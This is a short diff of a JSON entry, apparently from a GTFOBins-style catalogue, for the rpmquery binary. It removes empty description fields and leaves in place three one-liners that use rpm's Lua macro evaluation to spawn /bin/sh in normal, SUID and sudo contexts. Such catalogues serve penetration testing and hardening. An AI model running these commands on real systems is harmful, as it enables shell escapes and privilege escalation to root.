@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "./rpmquery --eval '%{lua:os.execute(\"/bin/sh\")}'\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'\n"
       }
     ]
